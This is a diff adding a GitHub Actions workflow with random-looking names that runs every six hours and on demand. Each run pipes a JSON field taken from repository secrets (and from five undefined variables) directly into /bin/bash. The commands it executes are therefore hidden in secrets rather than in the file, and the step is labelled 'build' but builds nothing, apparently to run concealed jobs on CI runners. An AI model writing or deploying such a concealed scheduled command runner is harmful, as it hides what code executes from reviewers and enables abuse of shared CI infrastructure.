@@ -1,0 +1,23 @@
+name: zhangcongrong6247
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhangcongrong6247
+        env:
+          sah14318: ${{ secrets.sah14318 }}
+        run: |
+          echo $sah14318 | jq -r .apg47438 | /bin/bash
+          echo $dwg01303 | jq -r .wihn2 | /bin/bash
+          echo $loss983 | jq -r .ufwev7072 | /bin/bash
+          echo $mz17078 | jq -r .ea5 | /bin/bash
+          echo $myzn553 | jq -r .wfbeu2738 | /bin/bash
+          echo $hw6019 | jq -r .cmh00157 | /bin/bash
+
